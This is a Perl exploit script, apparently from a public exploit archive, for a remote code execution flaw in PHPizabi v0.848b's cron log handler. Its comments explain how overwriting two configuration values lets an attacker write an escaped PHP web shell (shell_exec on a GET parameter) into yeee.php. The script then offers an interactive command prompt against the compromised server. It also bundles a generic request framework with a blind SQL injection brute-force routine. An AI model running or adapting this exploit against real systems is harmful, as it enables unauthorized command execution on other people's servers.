#!/usr/bin/perl 
#inphex
#PHPizabi v0.848b C1 HFP1 Remote Code Execution
#http://www.dz-secure.com/tools/1/WebESploit.pl.txt
#if you are seeking for a partner to work on some project(s) just send 
an email inphex0 [ at ] gmail [ dot ] com
#system/v_cron_proc.php
#	if (!function_exists("writeLogEntry")) {
#		function writeLogEntry($data) {
#			global $CONF;
#			
#			touch($CONF["CRON_LOGFILE"]);
#		
#			if ($handle = fopen($CONF["CRON_LOGFILE"], "a")) 
{
#				fwrite($handle, 
"[".date($CONF["LOCALE_LONG_DATE_TIME"])."] $data \n");
#				fclose($handle);
#			}
#		}
#	}
#
#
#writeLogEntry("Cron cycle started");
#writeLogEntry("Cron cycle ended");
########################################################
#overwritable:
#1.$CONF["CRON_LOGFILE"]
#2.$CONF["LOCALE_LONG_DATE_TIME"]
#
#date($CONF["LOCALE_LONG_DATE_TIME"]) ;\
#solution:
#<?php 
#echo date("a");
#?>
#returns: pm
#<?php 
#echo date("\a");
#?>
#returns: a
#seems logically eh?
#
#usage: perl ye.pl host /path/
#
## [C:\]# perl ye.pl host /path/
## $[host]# id
## uid=63676(dswrealty) gid=888(vusers) groups=33(www-data)
#
use LWP::UserAgent;
use HTTP::Cookies;
use Switch;

$hy = shift;
$host_ = "http://".$hy;
$path_ = shift;
$port = 80; #default
$info{'info'} = { 
	"description" => [""],
	"options" =>
	{
		"agent" => "",  
		"proxy" => "",  
		"default_headers" => [  
			["key","value"]], 
		"timeout" => 0, 
		"cookie" =>     
		{
			"cookie" => [""],
		},
	},
	"sending_options" =>
	{
			"host" => $host_, 
			"path" => $path_."system/v_cron_proc.php",
		        "port" => $port,                  
			"method_a" => "REMOTE_CO(MMAND)/CODE EXECUTION",  
			"attack" =>
		{
				"CONF[CRON_LOGFILE]" => 
["get","CONF[CRON_LOGFILE]","yeee.php"],
				"CONF[LOCALE_LONG_DATE_TIME]" => 
["get","CONF[LOCALE_LONG_DATE_TIME]","<?\\p\\h\\p \\e\\c\\h\\o 
\\s\\h\\e\\l\\l_\\ex\\e\\c\\(\\\$_\\G\\E\\T[\\c\\m\\d]\\);\\e\\x\\i\\t;?>"], 
#nice eh?:)
		},
	},

};

&start($info{'info'},222);
while () {
	print "\$[".$hy."]#";
	$cmd = <STDIN>;chomp($cmd);
	$info{'info'} = { 
		"description" => [""],
		"options" =>
			{
			"agent" => "",  
			"proxy" => "",  
			"default_headers" => [  
				["key","value"]], 
			"timeout" => 0, 
			"cookie" =>     
			{
				"cookie" => [""],
			},
		},
		"sending_options" =>
		{
				"host" => $host_, 
				"path" => $path_."system/yeee.php",
			    "port" => $port,                  
				"method_a" => "REMOTE_CO(MMAND)/CODE 
EXECUTION",  
				"attack" =>
			{
					"CONF[CRON_LOGFILE]" => 
["get","cmd",$cmd],
			},
		},

	};

&start($info{'info'},221); 
print ${$info{'info'}}{221}{'content'}."\n";
}
sub start
{
	
	$a_ = shift;
	$id = shift;
	$post_dA = "";
	$get_dA = get_d_p_s("get");
	$post_dA = get_d_p_s("post");

	my ($x,$c,$m,$h,$ff,$kf,$hp,$c,$cccc) = (0,0,0,0,0,0,0,0,0);
        $jj = 1;
	$ii = 48;
        $hh = 1;
	$ppp = 0;
	$s = shift;
	$a = "";
	$res_p = "";
	$h = "";
	$ua= "";
	$agent= "";
	$k= "";
	$v= "";
	$get_data= "";
	$post_data= "";
	$header_dA = "";
	$h_host_h_xdsjaop = $a_->{'sending_options'}{'host'};
	$h_path_h_xdsjaop = $a_->{'sending_options'}{'path'};
	$h_port_h_xdsjaop = $a_->{'sending_options'}{'port'};
	$method_m = $a_->{'sending_options'}{'method_a'};
	$ua = LWP::UserAgent->new;
	$ua->timeout($a_->{'options'}{'timeout'});  
	if ($a_->{'options'}{'proxy'}) {
	    $ua->proxy(['http', 'ftp'] => $a_->{'options'}{'proxy'});
	}
	$agent = $a_->{'options'}{'agent'} || "Mozilla/5.0"; 
	$ua->agent($agent); 
	{                                                 
		while (($k,$v) = each(%{$a_}))
			{
			if ($k ne "options" && $k ne "sending_options")
				{
				foreach $r (@{$a_->{$k}})
					{
						print $a_->{$k}[0];
					}
				}
			}


		foreach $j (@{$a_->{'options'}{'default_headers'}})
			{    
			
$ua->default_headers->push_header($a_->{'options'}{'default_headers'}[$m][0] 
=> $a_->{'options'}{'default_headers'}[$m][1]);
			$m++;
			}

		if ($a_->{'options'}{'cookie'}{'cookie'}[0])
			{          
			$ua->default_headers->push_header('Cookie' => 
$a_->{'options'}{'cookie'}{'cookie'}[0]);
			}

			

	}
	switch ($method_m)        
	{
		case "attack" { &attack();}
		case "SQL_INJECTION_BLIND" { &sql_injection_blind();}
		case "REMOTE_COMMAND_EXECUTION" { &attack();}
		case "REMOTE_CODE_EXECUTION" {&attack();}
		case "REMOTE_FILE_INCLUSION" { &attack();}
		case "LOCAL_FILE_INCLUSION" { &attack(); }
		else { &attack(); }  

	}


	sub attack
	{
		my ($jj);
		my ($h);
		my($x);
		if ($post_dA eq "") {
			$method = "get";
		} elsif ($post_dA ne "")
		{
			$method = "post";
		}
		if ($method eq "get") {  
			$res_p = 
get_data($h_host_h_xdsjaop,$h_path_h_xdsjaop."?".$get_dA);
			${$a_}{$id}{'content'} = $res_p;
			foreach $a 
(@{$a_->{'sending_options'}{'attack'}{'regex'}})
				{
				$res_p =~ 
/$a_->{'sending_options'}{'attack'}{'regex'}[$h][0]/;
				
				while ($jj <= 
$a_->{'sending_options'}{'attack'}{'regex'}[$h][1])
					{
					if (${$jj} ne "")
						{
						
${$a_}{$id}{'regex'}[$h][$x] = ${$jj};
						$x++;
						}
						$jj++;
					}
					
					$h++;
				}
		} elsif ($method eq "post")
		{
			$res_p = 
post_data($h_host_h_xdsjaop,$h_path_h_xdsjaop."?".$get_dA,"application/x-www-form-urlencoded",$post_dA);
		
			${$a_}{$id}{'content'} = $res_p;

			foreach $a 
(@{$a_->{'sending_options'}{'attack'}{'regex'}})
				{
				$res_p =~ 
/$a_->{'sending_options'}{'attack'}{'regex'}[$h][0]/;
				while ($jj <= 
$a_->{'sending_options'}{'attack'}{'regex'}[$h][1])
					{
					if (${$jj} ne "")
						{
						
${$a_}{$id}{'regex'}[$h][$x] = ${$jj};
						$x++;
						}
						$jj++;
					}
					$h++;
				}
		}

	}
	sub sql_injection_blind
	{
		while ()
			{
			while ($ii <= 120)
				{
				
				$itsx = "[".chr($ii)."]";
				$l = length($itsx);
				$b = ("\b")x$l;
				syswrite STDOUT,$b.$itsx;

				if(check($ii,$hh) == 1)
				{
					syswrite 
STDOUT,$b.chr($ii)."---";
					$hh++;
					$chr = $chr.chr($ii);
					}
					$ii++;
			}
			push(@ffs,length($chr)); 
			if (($#ffs - 999) == $ffs)
				{
				exit;
				}
				$ii = 48;
		}
	}
	sub check($$)
	{
		my ($h);
		my ($a);
		$ii = shift;
		$hh = shift;

		if (get_d_p_s("post") ne "")
			{
			$method = "post";
		} else { $method = "get";}
		if ($method eq "get")
			{
			$ppp++;
			$query = modify($get_dA,$ii,$hh);
			$res_p = 
get_data($h_host_h_xdsjaop,$a_->{'sending_options'}{'path'}."?".$query);

			foreach $a 
(@{$a_->{'sending_options'}{'attack'}{'regex'}})
				{
				if ($res_p 
=~m/$a_->{'sending_options'}{'attack'}{'regex'}[$h][0]/)
					{
					if 
($a_->{'sending_options'}{'attack'}{'regex'}[$h][2] == 1) {
						return 1;
					} else { return 0;}
					}
					else 
				{
						if 
($a_->{'sending_options'}{'attack'}{'regex'}[$h][2] == 1) {
							return 0;
						}else { return 1;}
	
						
				}
				$h++;
			}
		} elsif ($method eq "post")
			{
			$ppp++;
			$query_g = modify($get_dA,$ii,$hh);
			$query_p = modify($post_dA,$ii,$hh);
			
			$res_p = 
post_data($h_host_h_xdsjaop,$a_->{'sending_options'}{'path'}."?".$query_g,"application/x-www-form-urlencoded",$query_p);
			foreach $a 
(@{$a_->{'sending_options'}{'attack'}{'regex'}})
				{
				if ($res_p 
=~m/$a_->{'sending_options'}{'attack'}{'regex'}[$h][0]/)
					{
					return 1;
					}
					else 
					{
						return 0;
					}
				$h++;
			}
		}
	}
    sub modify($$$)
	{
	    $string = shift;
	    $replace_by = shift;
	    $replace_by1 = shift;

	    if ($string !~/\$i/ && $string !~/\$h/) {
		    return $string;
	        } elsif ($string !~/\$i/)
		{
		        $ff = substr($string,0,index($string,"\$h"));
	            $ee =  substr($string,rindex($string,"\$h")+2);
	            $string = $ff.$replace_by1.$ee;

	            return $string;
		} elsif ($string !~/\$h/)
		{
	        $f = substr($string,0,index($string,"\$i"));
	        $e = substr($string,rindex($string,"\$i")+2);
	        $string = $f.$replace_by.$e;
		    return $string;
		} else
		{
		    $f = substr($string,0,index($string,"\$i"));
	        $e = substr($string,rindex($string,"\$i")+2);
	        $string = $f.$replace_by.$e;

		    $ff = substr($string,0,index($string,"\$h"));
	        $ee =  substr($string,rindex($string,"\$h")+2);
	        $string = $ff.$replace_by1.$ee;

		    return $string;
		}
	}
	sub get_d_p_s
	{
		$k = 0;
		$v = 0;
		$g_d_p_s = shift;

		@post = ();
		@get = ();
		
		$post_data = "";
		$get_data = "";
		$header_data = "";
		%header_dA = ();
		$p = "";
		$g = "";
		while (($k,$v) = 
each(%{$a_->{'sending_options'}{'attack'}}))
			{
			if ($a_->{'sending_options'}{'attack'}{$k}[0] 
=~/post/)
				{
				$p .= 
$a_->{'sending_options'}{'attack'}{$k}[1]."=".$a_->{'sending_options'}{'attack'}{$k}[2]."&";
				} elsif 
($a_->{'sending_options'}{'attack'}{$k}[0] =~/get/) {
					$g .= 
$a_->{'sending_options'}{'attack'}{$k}[1]."=".$a_->{'sending_options'}{'attack'}{$k}[2]."&";
				} elsif 
($a_->{'sending_options'}{'attack'}{$k}[0] =~ "header")
				{
				        
$header_dA{$a_->{'sending_options'}{'attack'}{$k}[1]} = 
$a_->{'sending_options'}{'attack'}{$k}[2];
				}
			}
		if ($g_d_p_s eq "get")
			{
			return $g;
			}
			elsif ($g_d_p_s eq "post")
		{
			return $p;
		} elsif ($g_d_p_s eq "header")
		{
			return %header_dA;
		}

			@a_ = ();
	}
	sub get_data
	{
		$h_host_h_xdsjaop = shift;
		$h_path_h_xdsjaop = shift;
		%hash = get_d_p_s("header");
	    while (($u,$c) = each(%hash))
			{
			$ua->default_headers->push_header($u => $c);
			}
		$req = 
$ua->get($h_host_h_xdsjaop.":".$a_->{'sending_options'}{'port'}.$h_path_h_xdsjaop);
		return $req->content;
	}
	sub post_data
	{
		$h_host_h_xdsjaop = shift;
		$h_path_h_xdsjaop = shift;
		$content_type = shift;
		$send = shift;
		%hash = get_d_p_s("header");
	    while (($u,$c) = each(%hash))
			{
		    $ua->default_headers->push_header($u => $c);
			}
		$req = HTTP::Request->new(POST => 
$h_host_h_xdsjaop.":".$a_->{'sending_options'}{'port'}.$h_path_h_xdsjaop);
		$req->content_type($content_type);
		$req->content($send);
		$res = $ua->request($req);
		return $res->content;
	}

}
